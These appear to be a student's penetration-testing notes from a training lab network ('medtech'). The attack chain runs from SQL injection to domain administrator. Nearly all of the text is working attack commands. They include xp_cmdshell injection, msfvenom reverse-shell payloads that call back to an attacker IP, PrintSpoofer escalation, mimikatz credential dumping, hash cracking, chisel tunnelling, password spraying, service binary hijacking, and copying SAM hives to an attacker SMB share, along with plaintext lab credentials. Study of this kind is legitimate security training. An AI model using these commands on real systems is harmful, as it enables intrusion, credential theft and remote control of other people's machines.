```
nmap -sT -A 192.168.211.120-122
gobuster dir -u http://192.168.211.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern
sudo nmap -sC -sV -oN nmap 192.168.211.121
sudo nmap -sC -sV -oN nmap-client3 192.168.211.122


# example of file traversal for windows
../../../../../../../../../C:\inetpub\wwwroot
```
### SQL injection
- Go to webservice running at 192.168.214.121
- test sqli payloads from https://github.com/payloadbox/sql-injection-payload-list
- Discovered that the username textbox from the login form is vulnerable to SQLi
- just a backtick worked 

discover num cols - 2 cols does not throw error
we soon discover this is blind, so do a test ping
```
' ORDER BY 5-- //
' ORDER BY 4-- //
' ORDER BY 3-- //
' ORDER BY 2-- //

sudo tcpdump -i tun0 proto \\icmp
test';EXEC xp_cmdshell "ping 192.168.45.242"; --
```

create staged payload
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.242 LPORT=443 -f hta-psh -o met.hta`

```
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.242
set LPORT 443
set ExitOnSession false
run -j
```

execute payload with burp to catch shell
```
test';EXECUTE sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE;--

test';EXEC xp_cmdshell "mshta.exe http://192.168.45.242/met.hta "; --
```

Basic enumeration
- do we have debug or impersonate? - yes we have impersonate
- using printspoofer we are able to get admin privs as the system/authority user
- then we can run mimikatz to dump NTLM hashes
```
whoami /priv

iwr -uri http://192.168.45.242/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
```

Get winpeas on target
```
cp /usr/share/peass/winpeas/winPEASx64.exe medtech

# note that you need to be in a temp folder etc to have perms to download
cd C:\TEMP
powershell
iwr -uri http://192.168.45.242:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```
### found info
wpad.dmz.medtech.com                  208.91.197.27
jresig:secret
SeImpersonatePrivilege: enabled on current user
```
MEDTECH\joe - is logged in?
WEB02\Administrator
WEB02\offsec - can change password
```
this hash doesn't return anything
```
hashid "WEB02$::MEDTECH:1122334455667788:7c183fcf685951b78303df89e37a7146:0101000000000000a241e7087d19da0113380e2960fd32830000000008003000300000000000000000000000003000003447bf8d2e076bca15cf2a4eebe8e308c592a7dffe959d1f99900303a73185210a00100000000000000000000000000000000000090000000000000000000000"

hashcat --help | grep -i "NetNTLMv2"

hashcat -m 5600 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

get mimikatz on 121
```
iwr -uri http://192.168.45.242:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

returns 08d7a47a6f9f66b97b1bae4178747494 as joe's hash and Flowers1 as kerberos password

# also returns Flowers1
hashcat -m 1000 joe.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

scan the internal network. looks like all ports are closed due to a firewall
```
where ssh
ssh.exe -V
ssh -N -R 1080 kali@192.168.45.242

sudo systemctl status ssh
sudo systemctl start ssh

sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 22,80,445 172.16.214.10-14 172.16.214.82-83
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -F 172.16.214.10-14 172.16.214.82-83
```

get around the firewall using chisel. now we find that we can see ports open on some of the internal machines
```
cp /home/kali/beyond/chisel.exe /home/kali/medtech
cd C:\TEMP
iwr -uri http://192.168.45.242:8000/chisel.exe -Outfile chisel.exe

# from kali
chisel server --port 8081 --reverse
sudo tcpdump -nvvvXi tun0 tcp port 8081

# from windows
.\chisel.exe client 192.168.45.242:8081 R:socks

# from kali
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 22,80,8000,445,3306,3389 172.16.214.10-14 172.16.214.82-83

sudo proxychains -q nmap -sT -Pn -p 22,80,8000,445,3306,3389 172.16.214.11

# can we use winrm but it has wacky shell
sudo proxychains -q nmap -sT -Pn -p 5985,5986 172.16.214.11

# use impacket-psexec 
proxychains impacket-psexec joe:Flowers1@172.16.214.11
```
Ports open
172.16.214.82 - 3389, 445
172.16.214.83 - 445
172.16.214.14 - 22
172.16.214.13 - 445
172.16.214.12 - 3389, 445
172.16.214.11 - 445
172.16.214.10 - 445
```
proxychains crackmapexec smb 172.16.214.10-14 172.16.214.82-83 -u joe -p 'Flowers1' --continue-on-success
```
- Discover that smb signing is off on FILES02 (172.16.214.11) ,DEV04(172.16.214.12) and PROD01(172.16.214.13) meaning we could do a relay attack
- joe is admin  on FILES02 (172.16.214.11)
- joe's login also works on CLIENT01(172.16.214.82) and DC01 (172.16.214.10)
```
sudo proxychains xfreerdp /v:172.16.214.82 /u:joe /p:Flowers1 /cert-ignore /compression /auto-reconnect /d:medtech.com

sudo proxychains rdesktop 172.16.214.82 -u joe -p Flowers1

# joe has READ/WRITE on TEMP and C shares
proxychains crackmapexec smb 172.16.214.11 -u joe -p "Flowers1" --shares

# connect to host where joe is admin
proxychains evil-winrm -i 172.16.214.11 -u joe -p "Flowers1"

# use impacket-psexec instead as evilwinrm does not work
proxychains impacket-psexec joe:Flowers1@172.16.214.11
```

background sessions
```
ctrl-z on powershell
bg on meterpreter
```

```
Get-ChildItem -Path C:\Users\joe\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

after gaining access to FILES02 using winrm where joe is admin - WINRM ONLY
```
wget https://github.com/BloodHoundAD/BloodHound/blob/a78dff384767f06febf85dc9940e0d84890cfb51/Collectors/SharpHound.ps1

wget https://github.com/clymb3r/PowerShell/blob/bc6d547dcbcdaa2277748975d52ef748755723a4/Invoke-Mimikatz/Invoke-Mimikatz.ps1

iwr -uri http://192.168.45.242:8000/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1

Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz(privilege::debug)

privilege::debug
sekurlsa::logonpasswords
```

FILES02
- mimikatz dumping cache shows wario, yoshi and Administrator users but no NTLMs
```
iwr -uri http://192.168.45.242:8000/mimikatz.exe -Outfile mimikatz.exe

. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
lsadump::sam
```

powerview doesn't seem to work
```
iwr -uri http://192.168.45.242:8000/powerview.ps1 -Outfile powerview.ps1
```

find NTLM hashes in random log file
```
impacket-smbserver -smb2support -user joe -password Flowers1 smb smb 

net use \\192.168.45.242\smb /user:"joe" "Flowers1"
copy sam.save \\192.168.45.242\smb
copy security.save \\192.168.45.242\smb
copy system.save \\192.168.45.242\smb

impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

copy fileMonitorBackup.log \\192.168.45.242\smb

iconv -f utf-16 -t utf-8 fileMonitorBackup.log | grep 'wario'
iconv -f utf-16 -t utf-8 fileMonitorBackup.log | grep 'yoshi'
iconv -f utf-16 -t utf-8 fileMonitorBackup.log | grep 'peach'
iconv -f utf-16 -t utf-8 fileMonitorBackup.log | grep 'mario'
```

found NTLM for wario - fdf36048c1cf88f5630381c5e38feb8e
found password - Mushroom!
```
hashcat -m 1000 wario.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

hashcat -m 1000 daisy.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Spray passwords
```
sudo proxychains -q nmap -sT -Pn -p 445 172.16.249.11
proxychains crackmapexec smb 172.16.249.10-14 172.16.249.82-83 -u wario -p 'Mushroom!' --continue-on-success
```

Find yoshi's password by spraying existing passwords
- yoshi is a user on all machines, admin on 82
```
proxychains crackmapexec smb 172.16.249.10-14 172.16.249.82-83 -u yoshi -p passwords --continue-on-success

proxychains crackmapexec smb 172.16.249.10-14 172.16.249.82-83 -u yoshi -p Mushroom! --continue-on-success
```

yoshi is admin on CLIENT01- 172.16.249.82
```
proxychains impacket-psexec yoshi:Mushroom\!@172.16.249.82
```

```
iwr -uri http://192.168.45.242:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

iwr -uri http://192.168.45.242:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

iwr -uri http://192.168.45.242:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All
```

Got password for offsec user - lab, no admin on any box
```
hashcat -m 1000 offsec.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

proxychains crackmapexec smb 172.16.249.10-14 172.16.249.82-83 -u offsec -p 'lab' --continue-on-success
```

Try to find users via random files - find leon:rabbit!:)
```
Get-ChildItem -Path C:\Users\Administrator.MEDTECH\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

proxychains crackmapexec smb 172.16.188.10-14 172.16.188.82-83 -u leon -p 'rabbit!:)' --continue-on-success
```

Get lockout threshold
```
net accounts
```

We can't login using leon on 83 or 12 as we have status locked out - lets try the wario user found earlier
NOTE: adding a user for this exploit did not work as we were only a local not a system admin. we needed to generate a nonstaged reverse shell payload and use that to get nt authority/system
```
# does not work as shares not writable by non-admin
proxychains impacket-psexec wario:Mushroom\!@172.16.249.83

# use if no writable share
proxychains impacket-smbexec wario:Mushroom\!@172.16.249.83

proxychains impacket-wmiexec wario:Mushroom\!@172.16.249.83

# works but odd shell
proxychains evil-winrm -i 172.16.249.83 -u wario -p "Mushroom\!" 
upload powerview.ps1
upload winPEAS.exe
.\winPEAS.exe

# found writable exe
icacls C:\DevelopmentExecutables\auditTracker.exe

# for adding a user
x86_64-w64-mingw32-gcc adduser.c -o adduser2.exe
upload adduser2.exe
mv adduser2.exe auditTracker.exe
move C:\DevelopmentExecutables\auditTracker.exe C:\DevelopmentExecutables\auditTracker.exe.bak8
move .\auditTracker.exe C:\DevelopmentExecutables\
Restart-Service auditTracker

# check privs
net user
Get-LocalGroupMember administrators
Get-LocalGroupMember "Remote Desktop Users"
Get-LocalGroupMember "Remote Management Users"
proxychains evil-winrm -i 172.16.249.83 -u claudia3 -p "password123" 

# for using a shell
mv shell2.exe auditTracker.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=9999 -f exe -o shell.exe
nc -nvlp 9999

iwr -uri http://192.168.45.219:8000/shell.exe -Outfile shell.exe
.\shell.exe
```

From .83 as admin
```
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
iwr -uri http://192.168.45.242:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All

# from wario shell
impacket-smbserver -smb2support -user wario -password Mushroom\! smb smb 

net use \\192.168.45.242\smb /user:"wario" "Mushroom!"
copy 20231121125929_BloodHound.zip \\192.168.45.242\smb

sudo neo4j start
bloodhound # pw = kalitest

Find shortest path to domain admins
```
From bloodhound we discover that
- leon is domain admin
- leon has a session on DEV04 (12) meaning we can steal his creds or impersonate him to gain domain admin access
We also know that
- leon's username is LOCKED on both dev04 and the domain controller
- yoshi can login on 12
- we find the users mario and peach as well
``` 
# figure out what ports are open to see if we can rdp
```
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -F 172.16.249.12
```

# use RDP to gain local yoshi access
sudo proxychains xfreerdp /v:172.16.188.12 /u:yoshi /p:Mushroom\! /cert-ignore /compression /auto-reconnect /d:medtech.com

# get a better shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=7777 -f exe -o shell12.exe
nc -nvlp 7777

iwr -uri http://192.168.45.242:8000/shell12.exe -Outfile shell.exe
./shell.exe
```
found `C:\TEMP\backup.exe`
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=9998 -f exe -o shell-12.exe
nc -nvlp 9998

iwr -uri http://192.168.45.242:8000/Watch-Command.ps1 -Outfile Watch-Command.ps1

iwr -uri http://192.168.45.242:8000/shell-12.exe -Outfile backup.exe
move C:\TEMP\backup.exe C:\TEMP\backup.exe.bak
move .\backup.exe C:\TEMP\

Import-Module C:\Users\yoshi\Watch-Command.ps1
Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
```

Log onto DC01 as leon
```
proxychains impacket-psexec medtech.com/leon:'rabbit:)'@172.16.188.10
```

Found credentials
```
web01: offsec/century62hisan51
```

Machines left: 120, 122, 13, 14
```
nmap -sT -A 192.168.188.120-122
sudo nmap -sC -sV -oN nmap 192.168.188.120
sudo nmap -sC -sV -oN nmap 192.168.188.122
```
192.168.188.120
- 80
- 22
192.168.188.122
- 22

loginto WEB01
```
ssh offsec@192.168.188.120
find . -name local.txt 2>/dev/null

# solution for root is 
sudo -l 
sudo -i
```

For 22, first try all the users/passwords we have found so far, then use generic wordlist
```
hydra -l users.txt -P passwords -s 22 ssh://192.168.188.122

hydra -l offsec -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.188.122

# password
ssh offsec@192.168.188.122

# solution for root is gtfobins
https://gtfobins.github.io/gtfobins/openvpn/#sudo
```

Now we just need .13 and .14
```
proxychains nmap -sT -A 172.168.188.13-14
sudo proxychains -q nmap -sT -Pn -p 22,80,8000,445,3306,3389 172.16.188.13-14

# port 22 is open for 14
# port 445 is open for 13
proxychains crackmapexec smb 172.16.188.13  -u users.txt -p passwords --continue-on-success

# find that leon:rabbit:) is admin on .13
proxychains impacket-psexec leon:'rabbit:)'@172.16.188.13

# returns no successful logins
proxychains crackmapexec ssh 172.16.188.14  -u users.txt -p passwords --continue-on-success

# these fail as they take way too long
proxychains -q crackmapexec ssh 172.16.188.14  -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success

proxychains hydra -l offsec -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.188.14

# we need to use a key we found previously 
ssh2john mario_rsa > mario-ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

chmod 600 mario_rsa
proxychains ssh -i mario_rsa mario@172.16.188.14
```
